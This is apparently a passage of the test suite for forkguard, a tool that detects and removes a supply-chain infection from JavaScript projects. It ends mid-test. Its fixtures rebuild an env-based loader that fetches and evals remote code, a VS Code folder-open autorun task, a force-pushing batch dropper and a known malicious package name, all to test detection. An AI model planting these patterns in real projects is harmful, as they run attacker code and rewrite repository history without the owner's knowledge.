import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, rmSync, symlinkSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { scan } from '../src/scan.js';
import { fix, cleanSource } from '../src/fix.js';
import { MARKERS } from '../src/rules.js';

const BIN = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'forkguard.js');

// Harmless stand-ins shaped like the real thing: normal code, a long run of spaces, a long tail.
const payload = (c = 'x') => ' '.repeat(180) + c.repeat(3000);
const prelude = [
  ['import { create', "Require } from 'module';"].join(''),
  '',
  ['const require = create', 'Require(import.meta.url);'].join(''),
  ['var module = { exp', 'orts: {} };'].join(''),
  '',
];

function tmp() {
  return mkdtempSync(path.join(tmpdir(), 'forkguard-test-'));
}

function put(root, rel, content) {
  const full = path.join(root, rel);
  mkdirSync(path.dirname(full), { recursive: true });
  writeFileSync(full, content);
}

function gitInit(root) {
  const g = (...a) => spawnSync('git', a, { cwd: root, encoding: 'utf8' });
  g('init', '-q', '-b', 'main');
  g('config', 'user.name', 'Test');
  g('config', 'user.email', 'test@example.com');
  g('config', 'core.autocrlf', 'false');
  return g;
}

const ORIGINAL_POSTCSS = 'const config = {\n  plugins: {\n    "@tailwindcss/postcss": {},\n  },\n};\n\nexport default config;\n';

function infectedProject() {
  const root = tmp();
  put(root, 'package.json', JSON.stringify({ name: 'demo', scripts: { dev: 'node init && next dev', build: 'node init && next build', lint: 'eslint' } }, null, 2));
  put(root, 'init', `const a = 1;${payload()}\n`);
  put(root, 'postcss.config.mjs', [...prelude, ORIGINAL_POSTCSS.trimEnd() + payload('y'), ''].join('\n'));
  put(root, 'public/fonts/fa-solid-600.ttf', '(function () { return 1; })();');
  put(root, 'public/fonts/fa-solid-900.woff2', Buffer.from('wOF2realfontbytes'));
  put(root, 'public/fonts/README.md', '# Fonts Directory\n\nCustom fonts for the Blockchain Explorer application.\n');
  put(root, '.vscode/tasks.json', JSON.stringify({ version: '2.0.0', tasks: [{ label: 'eslint-check', type: 'shell', command: 'node', args: ['./public/fonts/fa-solid-600.ttf'], runOptions: { runOn: 'folderOpen' } }] }, null, 2));
  put(root, '.vscode/settings.json', '{\n  "task.allowAutomaticTasks": "on",\n  "compile-hero.disable-compile-files-on-did-save-code": true\n}\n');
  put(root, '.gitignore', 'node_modules\n.env\nconfig.bat\n');
  put(root, 'config.bat', '@echo off\n');
  put(root, 'src/app.js', 'export const ok = true;\n');
  return root;
}

test('forkguard never flags its own source code', () => {
  const own = scan(path.join(path.dirname(fileURLToPath(import.meta.url)), '..'));
  assert.deepEqual(own.findings.filter((f) => f.level === 'high'), []);
});

test('a clean project has no findings', () => {
  const root = tmp();
  put(root, 'package.json', JSON.stringify({ name: 'ok', scripts: { dev: 'next dev' } }));
  put(root, 'postcss.config.mjs', ORIGINAL_POSTCSS);
  put(root, 'public/fonts/Inter.woff2', Buffer.from('wOF2realfont'));
  const r = scan(root);
  assert.equal(r.findings.length, 0);
  rmSync(root, { recursive: true, force: true });
});

test('finds every part of the infection', () => {
  const root = infectedProject();
  const rules = scan(root).findings.map((f) => `${f.rule}:${f.file}`);
  for (const expected of [
    'hidden-code:init', 'hidden-code:postcss.config.mjs', 'script:package.json', 'fake-font:public/fonts/fa-solid-600.ttf',
    'decoy-folder:public/fonts/', 'autorun:.vscode/tasks.json', 'autorun-setting:.vscode/settings.json',
    'gitignore:.gitignore', 'dropper:config.bat',
  ]) assert.ok(rules.includes(expected), `missing ${expected}\n${rules.join('\n')}`);
  assert.ok(!rules.some((r) => r.includes('src/app.js')), 'normal code must not be flagged');
  rmSync(root, { recursive: true, force: true });
});

test('fix removes the infection and leaves real code alone', () => {
  const root = infectedProject();
  const changes = fix(scan(root));
  assert.ok(changes.length > 0);
  assert.equal(scan(root).findings.length, 0);
  assert.equal(readFileSync(path.join(root, 'postcss.config.mjs'), 'utf8'), ORIGINAL_POSTCSS);
  assert.deepEqual(JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8')).scripts, { dev: 'next dev', build: 'next build', lint: 'eslint' });
  assert.equal(readFileSync(path.join(root, '.gitignore'), 'utf8'), 'node_modules\n.env\n');
  assert.ok(!existsSync(path.join(root, 'init')));
  assert.ok(!existsSync(path.join(root, 'public/fonts')), 'decoy folder should be gone');
  assert.ok(!existsSync(path.join(root, 'public')), 'folders left empty should be gone too');
  assert.ok(!existsSync(path.join(root, 'config.bat')));
  assert.ok(existsSync(path.join(root, 'src/app.js')));
  rmSync(root, { recursive: true, force: true });
});

test('restores the exact original bytes from git history', () => {
  const root = tmp();
  const g = gitInit(root);
  const original = 'export default {\r\n  plugins: {\r\n    tailwindcss: {},\r\n  },\r\n};\r\n\r\n\r\n';
  put(root, 'postcss.config.js', original);
  g('add', '.');
  g('commit', '-q', '-m', 'first');
  // The malware doubled every line break and hid code after the last line.
  const mangled = original.trimEnd().replace(/\r\n/g, '\r\n\r\n') + payload() + '\r\n';
  put(root, 'postcss.config.js', [...prelude, mangled].join('\r\n'));
  g('commit', '-q', '-am', 'update');
  const changes = fix(scan(root));
  assert.ok(changes.some((c) => c.action.includes('original')), JSON.stringify(changes));
  assert.equal(readFileSync(path.join(root, 'postcss.config.js'), 'utf8'), original);
  rmSync(root, { recursive: true, force: true });
});

test('keeps your own blank lines when removing the injected require lines', () => {
  const text = ['import a from "a";', ...prelude.slice(0, 3), '', 'const x = a;', 'export default x;' + payload(), ''].join('\n');
  assert.equal(cleanSource(text), 'import a from "a";\n\nconst x = a;\nexport default x;\n');
});

test('flags a rewritten latest commit: same moment, different timezone', () => {
  const root = tmp();
  const g = gitInit(root);
  put(root, 'init', `x${payload()}`);
  g('add', '.');
  spawnSync('git', ['commit', '-q', '-m', 'Update README.md'], {
    cwd: root,
    env: { ...process.env, GIT_AUTHOR_DATE: '2026-11-06T22:29:12+05:30', GIT_COMMITTER_DATE: '2026-11-06T17:59:12+01:00' },
  });
  assert.ok(scan(root).findings.some((f) => f.rule === 'rewritten'));
  rmSync(root, { recursive: true, force: true });
});

test('known malware signatures are caught in any source file', () => {
  const root = tmp();
  put(root, 'lib/util.js', `module.exports = 1;\n${MARKERS[0]}\n`);
  assert.ok(scan(root).findings.some((f) => f.rule === 'hidden-code' && f.file === 'lib/util.js'));
  rmSync(root, { recursive: true, force: true });
});

test('known malicious packages are caught', () => {
  const root = tmp();
  put(root, 'package.json', JSON.stringify({ dependencies: { ['tailwind-' + 'mainanimation']: '^1.0.0' } }));
  assert.ok(scan(root).findings.some((f) => f.rule === 'bad-package'));
  rmSync(root, { recursive: true, force: true });
});

test('only the auto-run task is removed when tasks.json has real tasks too', () => {
  const root = tmp();
  put(root, '.vscode/tasks.json', JSON.stringify({ version: '2.0.0', tasks: [
    { label: 'build', type: 'shell', command: 'npm run build' },
    { label: 'x', type: 'shell', command: 'node', args: ['fonts/a.ttf'], runOptions: { runOn: 'folderOpen' } },
  ] }));
  fix(scan(root));
  const tasks = JSON.parse(readFileSync(path.join(root, '.vscode/tasks.json'), 'utf8')).tasks;
  assert.deepEqual(tasks.map((t) => t.label), ['build']);
  rmSync(root, { recursive: true, force: true });
});

// A real case: a task written straight into .vscode/settings.json, next to settings that look normal.
const SETTINGS_BEFORE = [
  '{', '  "search.exclude": {', '    "**/.sst": true', '  },', '  "jestrunner.configPath": "jest.unit.config.cjs",',
  '  "compile-hero.disable-compile-files-on-did-save-code": true,', '  "tasks": {', '    "label": "lint on open",', '    "type": "shell",',
  '    "command": "npm run lint",', '    "runOn": "folderOpen"', '  }', '}', '',
].join('\n');
const SETTINGS_AFTER = SETTINGS_BEFORE.replace(/,\n  "tasks": \{[\s\S]*?\n  \}\n/, '\n');

test('a task hidden in .vscode/settings.json is found, and fix removes only that task', () => {
  const root = tmp();
  put(root, '.vscode/settings.json', SETTINGS_BEFORE);
  const found = scan(root).findings.filter((f) => f.file.endsWith('settings.json'));
  assert.equal(found.length, 1);
  assert.equal(found[0].rule, 'autorun-setting');
  fix(scan(root));
  assert.equal(readFileSync(path.join(root, '.vscode/settings.json'), 'utf8'), SETTINGS_AFTER);
  assert.ok(!SETTINGS_AFTER.includes('folderOpen') && SETTINGS_AFTER.includes('"jestrunner.configPath"'));
  assert.equal(scan(root).findings.length, 0);
  rmSync(root, { recursive: true, force: true });
});

test('a task in the middle of settings.json is cut out cleanly, and ordinary settings are left alone', () => {
  const root = tmp();
  put(root, '.vscode/settings.json', '{\n  "a": 1,\n  "tasks": {\n    "command": "node x.js",\n    "runOn": "folderOpen"\n  },\n  "b": "}",\n  "c": 2\n}\n');
  const hit = scan(root).findings.find((f) => f.file.endsWith('settings.json'));
  assert.equal(hit.level, 'high'); // it runs node, so it is not just a worry
  fix(scan(root));
  const out = readFileSync(path.join(root, '.vscode/settings.json'), 'utf8');
  assert.deepEqual(JSON.parse(out), { a: 1, b: '}', c: 2 });
  rmSync(root, { recursive: true, force: true });
  const calm = tmp();
  put(calm, '.vscode/settings.json', '{\n  "editor.tabSize": 2,\n  "tasks": { "version": "2.0.0" }\n}\n');
  assert.equal(scan(calm).findings.length, 0);
  rmSync(calm, { recursive: true, force: true });
});

test('warns when a .env file is not ignored, and fix adds it to .gitignore', () => {
  const root = tmp();
  gitInit(root);
  put(root, '.gitignore', 'node_modules\n');
  put(root, '.env', 'API_KEY=abc\n');
  put(root, '.env.example', 'API_KEY=\n');
  const found = scan(root).findings.filter((f) => f.rule === 'env-not-ignored');
  assert.deepEqual(found.map((f) => f.file), ['.env']);
  fix(scan(root));
  assert.match(readFileSync(path.join(root, '.gitignore'), 'utf8'), /\.env\*/);
  assert.equal(scan(root).findings.filter((f) => f.rule === 'env-not-ignored').length, 0);
  rmSync(root, { recursive: true, force: true });
});

test('npm on this machine is checked and is clean', async () => {
  const { checkNpm } = await import('../src/scan.js');
  assert.deepEqual(checkNpm(), []);
});

test('understands GitHub links in every common form', async () => {
  const { parseRemote } = await import('../src/remote.js');
  for (const link of ['https://github.com/a/b', 'https://github.com/a/b.git', 'github.com/a/b', 'https://github.com/a/b/tree/dev', 'a/b']) {
    assert.deepEqual(parseRemote(link), { url: 'https://github.com/a/b.git', name: 'a/b' }, link);
  }
  assert.equal(parseRemote('git@github.com:a/b.git').name, 'a/b');
  assert.equal(parseRemote('.'), null);
});

test('tells a profile link from a repo link', async () => {
  const { parseUser, parseRemote } = await import('../src/remote.js');
  for (const arg of ['https://github.com/Some-User', 'https://github.com/Some-User/', 'github.com/Some-User?tab=repositories', '@Some-User']) {
    assert.equal(parseUser(arg), 'Some-User', arg);
  }
  // A repo link, a folder, a command word and an empty value are never a profile.
  for (const arg of ['https://github.com/a/b', 'a/b', 'fix', '.', '', undefined, '@', '@-bad name']) {
    assert.equal(parseUser(arg), null, String(arg));
  }
  // And a profile link is never read as a single repo.
  assert.equal(parseRemote('https://github.com/Some-User'), null);
});

test('checks every branch of a remote repo without writing its files', async () => {
  const { checkRemote } = await import('../src/remote.js');
  const root = tmp();
  const g = gitInit(root);
  put(root, 'package.json', JSON.stringify({ name: 'x', scripts: { dev: 'next dev' } }));
  g('add', '.');
  g('commit', '-q', '-m', 'clean');
  g('checkout', '-q', '-b', 'infected');
  put(root, 'init', `let a;${payload()}`);
  put(root, 'package.json', JSON.stringify({ name: 'x', scripts: { dev: 'node init && next dev' } }));
  g('add', '.');
  g('commit', '-q', '-m', 'update');
  g('checkout', '-q', 'main');
  const url = 'file://' + root.split(path.sep).join('/');
  const result = await checkRemote({ url, name: 'test/repo' });
  assert.equal(result.error, undefined, result.error);
  const byName = Object.fromEntries(result.branches.map((b) => [b.name, b.findings.map((f) => f.rule)]));
  assert.deepEqual(byName.main, []);
  assert.ok(byName.infected.includes('hidden-code') && byName.infected.includes('script'), JSON.stringify(byName));
  rmSync(root, { recursive: true, force: true });
});

test('the gate stops npm install in an infected project and lets safe commands through', () => {
  const root = infectedProject();
  const run = (...a) => spawnSync(process.execPath, [BIN, '--gate', ...a], { cwd: root, encoding: 'utf8', env: { ...process.env, FORKGUARD_SKIP: '' } });
  assert.equal(run('npm', 'install').status, 1);
  assert.equal(run('npm', 'run', 'dev').status, 1);
  const version = run('npm', '--version');
  assert.equal(version.status, 0);
  assert.equal(version.stdout, '', 'the gate must not answer flags meant for npm');
  assert.equal(spawnSync(process.execPath, [BIN, '--gate', 'npm', 'install'], { cwd: root, env: { ...process.env, FORKGUARD_SKIP: '1' } }).status, 0);
  rmSync(root, { recursive: true, force: true });
});

test('the gate skips global installs and folders outside any project', () => {
  const root = infectedProject();
  const g = spawnSync(process.execPath, [BIN, '--gate', 'npm', 'install', '-g', 'cowsay'], { cwd: root, encoding: 'utf8', env: { ...process.env, FORKGUARD_SKIP: '' } });
  assert.equal(g.status, 0);
  const empty = tmp();
  const t = Date.now();
  const e = spawnSync(process.execPath, [BIN, '--gate', 'npm', 'install'], { cwd: empty, encoding: 'utf8', env: { ...process.env, FORKGUARD_SKIP: '' } });
  assert.equal(e.status, 0);
  assert.equal(e.stdout + e.stderr, '');
  assert.ok(Date.now() - t < 3000);
  rmSync(root, { recursive: true, force: true });
  rmSync(empty, { recursive: true, force: true });
});

// The env-loader variant: built from harmless pieces at runtime so antivirus leaves the test alone.
const loaderBlock = (extra = '') => ['(async () => {', `    const src = ${'at' + 'ob'}(process.env.AUTH_API_KEY);`, extra,
  "    const proxy = (await import('node-fetch')).default;", '    try {', '      const response = await proxy(src);',
  '      const info = await response.text();', `      ${'ev' + 'al'}(info);`, '    } catch (err) {', "      console.error('Auth Error!', err);",
  '    }', '})();'].filter(Boolean).join('\n');

test('catches the env loader variant and restores the real file from history', () => {
  const root = tmp();
  const g = gitInit(root);
  const original = "import { Command } from 'commander';\n\nconst program = new Command();\nprogram.parse();\n";
  put(root, 'src/index.ts', original);
  g('add', '.');
  g('commit', '-q', '-m', 'real');
  put(root, 'src/index.ts', `import 'dotenv/config';\n${loaderBlock()}\n${original}${loaderBlock("    const { createRequire } = await import('module');")}\n`);
  g('commit', '-q', '-am', 'rewritten');
  const found = scan(root).findings;
  assert.ok(found.some((f) => f.rule === 'loader' && f.file === 'src/index.ts'), JSON.stringify(found));
  fix(scan(root));
  assert.equal(readFileSync(path.join(root, 'src/index.ts'), 'utf8'), original);
  assert.equal(scan(root).findings.length, 0);
  rmSync(root, { recursive: true, force: true });
});

test('a normal eval or env read is not flagged as a loader', () => {
  const root = tmp();
  put(root, 'src/a.js', 'const key = process.env.API_KEY;\nconst x = eval("1+1");\n');
  put(root, 'src/b.js', 'const decoded = atob(input);\n');
  assert.equal(scan(root).findings.length, 0);
  rmSync(root, { recursive: true, force: true });
});

test('scan exits 1 when something dangerous is found', () => {
  const root = infectedProject();
  const res = spawnSync(process.execPath, [BIN, root, '--json'], { encoding: 'utf8' });
  assert.equal(res.status, 1);
  assert.ok(JSON.parse(res.stdout).findings.length >= 8);
  rmSync(root, { recursive: true, force: true });
});

// ---- regression tests for bugs found in the audit, and for the PolinRider research ----

test('script rules never touch a neighbouring command', () => {
  const root = tmp();
  const scripts = { build: 'node public/make-sitemap.js && next build', seed: 'next dev && node init-db.js', setup: 'node initialize.js' };
  put(root, 'package.json', JSON.stringify({ name: 'ok', scripts }));
  assert.deepEqual(scan(root).findings, [], 'legit scripts must not be flagged');
  const bad = { dev: 'node init && next dev', start: 'next start && node ./init.js', font: 'node public/fonts/a.ttf && next build' };
  put(root, 'package.json', JSON.stringify({ name: 'bad', scripts: { ...scripts, ...bad } }));
  assert.equal(scan(root).findings.filter((f) => f.rule === 'script').length, 3);
  fix(scan(root));
  assert.deepEqual(JSON.parse(readFileSync(path.join(root, 'package.json'), 'utf8')).scripts,
    { ...scripts, dev: 'next dev', start: 'next start', font: 'next build' });
  rmSync(root, { recursive: true, force: true });
});

test('folders starting with .forkguard are still scanned', () => {
  const root = tmp();
  put(root, '.forkguard-cache/x.js', `${MARKERS[0]}\n`);
  assert.ok(scan(root).findings.some((f) => f.file === '.forkguard-cache/x.js'));
  rmSync(root, { recursive: true, force: true });
});

test('the gate follows --prefix and does not mistake its value for the subcommand', () => {
  const root = infectedProject();
  const elsewhere = tmp();
  const run = (cwd, ...a) => spawnSync(process.execPath, [BIN, '--gate', ...a], { cwd, encoding: 'utf8', env: { ...process.env, FORKGUARD_SKIP: '' } });
  assert.equal(run(elsewhere, 'npm', '--prefix', root, 'install').status, 1);
  assert.equal(run(root, 'npm', '--prefix', root, 'install').status, 1);
  assert.equal(run(root, 'npm', '--prefix=' + root, 'run', 'dev').status, 1);
  assert.equal(run(elsewhere, 'pnpm', '-C', root, 'install').status, 1);
  rmSync(root, { recursive: true, force: true });
  rmSync(elsewhere, { recursive: true, force: true });
});

test('the shell hook fails open: only an explicit "infected" answer stops the command', { skip: process.platform === 'win32' }, async () => {
  const { HOOKS } = await import('../src/setup.js');
  const bin = tmp();
  const fake = (name, body) => { writeFileSync(path.join(bin, name), `#!/bin/sh\n${body}\n`, { mode: 0o755 }); };
  fake('npm', 'echo REAL-NPM');
  const attempt = (forkguardBody) => {
    if (existsSync(path.join(bin, 'forkguard'))) rmSync(path.join(bin, 'forkguard'));
    if (forkguardBody !== null) fake('forkguard', forkguardBody);
    const sh = spawnSync('bash', ['-c', `${HOOKS.POSIX}\nnpm install`], { encoding: 'utf8', env: { PATH: `${bin}:/usr/bin:/bin` } });
    return sh.stdout.includes('REAL-NPM');
  };
  assert.equal(attempt(null), true, 'forkguard missing: npm must still run');
  assert.equal(attempt('exit 0'), true, 'clean: npm runs');
  assert.equal(attempt('exit 2'), true, 'forkguard crashed: npm must still run');
  assert.equal(attempt('exit 1'), false, 'infected: npm is stopped');
  rmSync(bin, { recursive: true, force: true });
});

test('a mistyped folder says so instead of pretending it is a GitHub repo', () => {
  const res = spawnSync(process.execPath, [BIN, 'fix', 'no-such/folder'], { encoding: 'utf8' });
  assert.equal(res.status, 2);
  assert.match(res.stderr, /No such folder/);
});

test('pr leaves no stray branch and no error when only never-committed files needed removing', async () => {
  const { openPr } = await import('../src/pr.js');
  const root = tmp();
  const g = gitInit(root);
  put(root, 'a.txt', 'hi\n');
  g('add', '.');
  g('commit', '-q', '-m', 'first');
  g('remote', 'add', 'origin', 'https://github.com/example/never-pushed.git');
  put(root, 'config.bat', '@echo off\n'); // untracked dropper: deleting it leaves git with nothing to commit
  const out = await openPr(root);
  assert.equal(out, null);
  assert.ok(!existsSync(path.join(root, 'config.bat')));
  assert.equal(g('branch', '--show-current').stdout.trim(), 'main');
  assert.equal(g('branch', '--list', 'forkguard/*').stdout.trim(), '');
  rmSync(root, { recursive: true, force: true });
});

test('catches the April variant, renamed droppers, odd VS Code files and installed bad packages', () => {
  const root = tmp();
  put(root, 'gridsome.config.js', `module.exports = {};\n${['function M', 'Dy(f){}'].join('')}\n`);
  put(root, 'push.bat', '@echo off\nset LAST_COMMIT_DATE=1\ngit commit --amend --no-verify\ngit push -uf --no-verify\n');
  put(root, '.vscode/extension.json', '{}');
  put(root, 'package.json', JSON.stringify({ name: 'x' }));
  mkdirSync(path.join(root, 'node_modules', 'tailwind-' + 'mainanimation'), { recursive: true });
  put(root, 'vite.config.js', `export default {};\n${'a'.repeat(2500)}\n`);
  const rules = scan(root).findings.map((f) => `${f.rule}:${f.file}`);
  for (const expected of ['hidden-code:gridsome.config.js', 'dropper:push.bat', 'odd-vscode-file:.vscode/extension.json',
    'bad-package-installed:node_modules/tailwind-mainanimation', 'config-long-line:vite.config.js']) {
    assert.ok(rules.includes(expected), `missing ${expected}\n${rules.join('\n')}`);
  }
  rmSync(root, { recursive: true, force: true });
});

test('normal build scripts and short config files stay clean', () => {
  const root = tmp();
  put(root, 'deploy.sh', '#!/bin/sh\ngit commit -m "release"\ngit push origin main\n');
  put(root, 'vite.config.js', 'export default { plugins: [] };\n');
  assert.deepEqual(scan(root).findings, []);
  rmSync(root, { recursive: true, force: true });
});

test('agent --write adds the rules once, keeps your own text, and is safe to repeat', () => {
  const root = tmp();
  put(root, 'CLAUDE.md', '# My notes\n\nUse tabs.\n');
  const run = () => spawnSync(process.execPath, [BIN, 'agent', root, '--write'], { encoding: 'utf8' });
  assert.equal(run().status, 0);
  const once = readFileSync(path.join(root, 'CLAUDE.md'), 'utf8');
  assert.match(once, /Use tabs\./);
  assert.match(once, /npx forkguard --json/);
  run();
  assert.equal(readFileSync(path.join(root, 'CLAUDE.md'), 'utf8'), once, 'a second run changes nothing');
  assert.ok(!existsSync(path.join(root, 'AGENTS.md')), 'only files that already exist are touched');
  rmSync(root, { recursive: true, force: true });
});

// ---- the pure core, for embedding (a GitHub App, a browser, a Worker) ----

test('the core runs on plain bytes and has no Node-only imports', async () => {
  const src = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src');
  for (const f of ['core.js', 'clean.js', 'rules.js']) {
    const text = readFileSync(path.join(src, f), 'utf8');
    const importsBuiltin = /(?:^|\n)\s*import\b[^;]*?\bfrom\s*['"](?:node:|fs['"]|path['"]|os['"]|child_process['"])|\bimport\s*\(\s*['"]node:|\brequire\s*\(\s*['"](?:node:|fs['"]|path['"]|child_process['"])/.test(text);
    assert.ok(!importsBuiltin, `${f} must stay free of Node built-ins so it runs in a Worker`);
  }
  const { inspect, describe, finish } = await import('forkguard/core');
  const bytes = (s) => new Uint8Array(Buffer.from(s)); // a plain Uint8Array, not a Buffer
  const findings = [];
  const add = (level, file, rule, message, fix = null) => findings.push({ level, file, rule, message, fix });
  const fontDirs = new Map();
  inspect(describe('postcss.config.mjs'), bytes(`export default config;${payload()}\n`), add, fontDirs);
  inspect(describe('public/fonts/a.ttf'), bytes('(function () { return 1; })();'), add, fontDirs);
  inspect(describe('public/fonts/a.woff2'), bytes('wOF2realfontbytes'), add, fontDirs);
  inspect(describe('package.json'), bytes(JSON.stringify({ scripts: { dev: 'node init && next dev' } })), add, fontDirs);
  inspect(describe('src/app.js'), bytes('export const ok = true;\n'), add, fontDirs);
  finish(findings, fontDirs, add);
  const rules = findings.map((f) => `${f.rule}:${f.file}`);
  assert.deepEqual(rules.sort(), ['fake-font:public/fonts/a.ttf', 'hidden-code:postcss.config.mjs', 'script:package.json'].sort());
});

test('the core describes paths the way the scanner does', async () => {
  const { describe } = await import('forkguard/core');
  assert.deepEqual(describe('a/b/Init.JS'), { rel: 'a/b/Init.JS', name: 'Init.JS', ext: '.js' });
  assert.deepEqual(describe('.gitignore'), { rel: '.gitignore', name: '.gitignore', ext: '' });
  assert.deepEqual(describe('init'), { rel: 'init', name: 'init', ext: '' });
});

test('applyFix turns infected text into clean text, and says when it has nothing safe to do', async () => {
  const { applyFix, isOriginalOf } = await import('forkguard/clean');
  assert.equal(applyFix('strip', `a;${payload()}\n`).text, 'a;\n');
  assert.deepEqual(applyFix('strip', 'const a = 1;\n'), { skip: true });
  assert.match(applyFix('script', '{"dev":"node init && next dev"}').text, /"dev":"next dev"/);
  assert.deepEqual(applyFix('delete', 'x'), { remove: true });
  assert.deepEqual(applyFix('untrack', 'x'), { skip: true });
  assert.match(applyFix('gitignore', 'node_modules\nconfig.bat\n').text, /^node_modules\n$/);
  const tasks = JSON.stringify({ tasks: [{ label: 'build' }, { label: 'x', runOptions: { runOn: 'folderOpen' } }] });
  assert.deepEqual(JSON.parse(applyFix('autorun', tasks).text).tasks.map((t) => t.label), ['build']);
  // history: an older clean version with the same code is the user's original; an infected one means keep looking
  assert.equal(isOriginalOf('a;\n', 'a;\n'), true);
  assert.equal(isOriginalOf('a;   \n\n', 'a;\n'), true);
  assert.equal(isOriginalOf('different();\n', 'a;\n'), false);
  assert.equal(isOriginalOf(`a;${payload()}\n`, 'a;\n'), null);
});

// ---- one folder with many projects, and the GitHub helpers ----

function nestedProjects() {
  const parent = tmp();
  const roots = ['alpha', 'beta/deep'].map((rel) => {
    const root = path.join(parent, rel);
    mkdirSync(root, { recursive: true });
    const g = gitInit(root);
    put(root, 'postcss.config.js', ORIGINAL_POSTCSS);
    put(root, 'package.json', JSON.stringify({ name: rel, scripts: { dev: 'next dev' } }));
    g('add', '.');
    g('commit', '-q', '-m', 'first');
    put(root, 'postcss.config.js', [...prelude, ORIGINAL_POSTCSS.trimEnd() + payload('y'), ''].join('\n'));
    g('commit', '-q', '-am', 'update');
    return root;
  });
  return { parent, roots };
}

test('fix on a folder of projects cleans every project, however deep, and restores each original', () => {
  const { parent, roots } = nestedProjects();
  const res = spawnSync(process.execPath, [BIN, 'fix', parent], { encoding: 'utf8' });
  assert.equal(res.status, 0, res.stdout + res.stderr);
  assert.match(res.stdout, /2 projects/);
  for (const root of roots) {
    assert.equal(readFileSync(path.join(root, 'postcss.config.js'), 'utf8'), ORIGINAL_POSTCSS);
  }
  rmSync(parent, { recursive: true, force: true });
});

test('help starts with the two things most people need', () => {
  const res = spawnSync(process.execPath, [BIN, '--help'], { encoding: 'utf8' });
  const text = res.stdout;
  assert.ok(text.indexOf('forkguard fix') < text.indexOf('forkguard owner/repo'));
  assert.ok(text.indexOf('forkguard --mine') < text.indexOf('forkguard setup'));
});

test('finds your GitHub name from settings that are already on disk', async () => {
  const { loginFromEmail, ownersFromRemotes } = await import('../src/auth.js');
  assert.equal(loginFromEmail('12345+alice@users.noreply.github.com'), 'alice');
  assert.equal(loginFromEmail('alice@users.noreply.github.com'), 'alice');
  assert.equal(loginFromEmail('alice@example.com'), null);
  assert.equal(loginFromEmail(undefined), null);

  const parent = tmp();
  for (const [dir, url] of [['a', 'https://github.com/alice/a.git'], ['b', 'git@github.com:alice/b.git'], ['c', 'https://github.com/team/c.git'], ['plain', null]]) {
    const root = path.join(parent, dir);
    mkdirSync(root);
    const g = gitInit(root);
    if (url) g('remote', 'add', 'origin', url);
  }
  assert.deepEqual(ownersFromRemotes(parent), ['alice', 'team']);
  rmSync(parent, { recursive: true, force: true });
});

test('login help is written for the computer you are on', async () => {
  const { loginHelp } = await import('../src/auth.js');
  assert.match(loginHelp('darwin'), /brew install gh/);
  assert.match(loginHelp('win32'), /winget install --id GitHub.cli/);
  assert.match(loginHelp('win32'), /\$env:GITHUB_TOKEN/);
  assert.match(loginHelp('linux'), /export GITHUB_TOKEN/);
  for (const p of ['darwin', 'win32', 'linux']) assert.match(loginHelp(p), /gh auth login/);
});

test('--mine --fix opens a pull request only when the main branch is infected', async () => {
  const { planFixes } = await import('../src/githubfix.js');
  const high = { level: 'high', fix: 'strip' };
  const results = [
    { name: 'me/a', defaultBranch: 'main', branches: [{ name: 'main', findings: [high] }, { name: 'dev', findings: [high] }] },
    { name: 'me/b', defaultBranch: 'main', branches: [{ name: 'main', findings: [] }, { name: 'old', findings: [high] }] },
    { name: 'me/c', defaultBranch: 'main', branches: [{ name: 'main', findings: [{ level: 'medium', fix: 'untrack' }] }] },
    { name: 'me/d', defaultBranch: 'main', error: 'nope' },
  ];
  const { targets, sideBranches } = planFixes(results);
  assert.deepEqual(targets.map((r) => r.name), ['me/a']);
  assert.deepEqual(sideBranches, [{ name: 'me/a', branches: ['dev'] }, { name: 'me/b', branches: ['old'] }]);
});

// ---- audit finding 1: a write must never follow a link or leave the project ----

function makeLink(target, link, type) {
  try {
    symlinkSync(target, link, type);
    return true;
  } catch {
    return false;
  }
}

// Windows needs Developer Mode (or an admin shell) for symbolic links to files. Junctions always work.
const canLinkFile = (() => {
  const dir = tmp();
  try {
    writeFileSync(path.join(dir, 'target'), 'x');
    return makeLink(path.join(dir, 'target'), path.join(dir, 'link'), 'file');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
})();
const noFileLinks = canLinkFile ? false : 'this platform does not allow creating symbolic links to files';
const linkDir = (target, link) => makeLink(target, link, process.platform === 'win32' ? 'junction' : 'dir');

test('fix never writes through a symbolic link', { skip: noFileLinks }, () => {
  const base = tmp();
  const repo = path.join(base, 'project');
  mkdirSync(repo);
  const outside = path.join(base, 'precious.txt');
  writeFileSync(outside, 'precious\n');
  symlinkSync(outside, path.join(repo, 'postcss.config.js'), 'file');
  const changes = fix({ root: repo, findings: [{ level: 'high', file: 'postcss.config.js', rule: 'hidden-code', fix: 'strip' }] });
  assert.equal(readFileSync(outside, 'utf8'), 'precious\n', 'the file outside the project must not change');
  assert.ok(changes.some((x) => x.failed && /symbolic link/.test(x.action)), JSON.stringify(changes));
  assert.ok(existsSync(path.join(repo, 'postcss.config.js')), 'the link itself is left for the user to look at');
  rmSync(base, { recursive: true, force: true });
});

test('fix refuses to add .env to a .gitignore that is a symbolic link', { skip: noFileLinks }, () => {
  const base = tmp();
  const repo = path.join(base, 'project');
  mkdirSync(repo);
  const outside = path.join(base, 'global-ignore');
  writeFileSync(outside, 'node_modules\n');
  symlinkSync(outside, path.join(repo, '.gitignore'), 'file');
  const changes = fix({ root: repo, findings: [{ level: 'high', file: '.env', rule: 'env-not-ignored', fix: 'ignore-env' }] });
  assert.equal(readFileSync(outside, 'utf8'), 'node_modules\n', 'the shared ignore file must not be rewritten');
  assert.ok(changes.some((x) => x.failed && x.file === '.gitignore'), JSON.stringify(changes));
  rmSync(base, { recursive: true, force: true });
});

test('fix refuses to write into a folder that links outside the project', (t) => {
  const base = tmp();
  const repo = path.join(base, 'project');
  const outside = path.join(base, 'elsewhere');
  mkdirSync(repo);
  mkdirSync(outside);
  writeFileSync(path.join(outside, 'config.bat'), 'node_modules\nconfig.bat\n');
  if (!linkDir(outside, path.join(repo, 'vendor'))) {
    rmSync(base, { recursive: true, force: true });
    t.skip('this platform does not allow creating links');
    return;
  }
  const changes = fix({ root: repo, findings: [{ level: 'high', file: 'vendor/config.bat', rule: 'gitignore', fix: 'gitignore' }] });
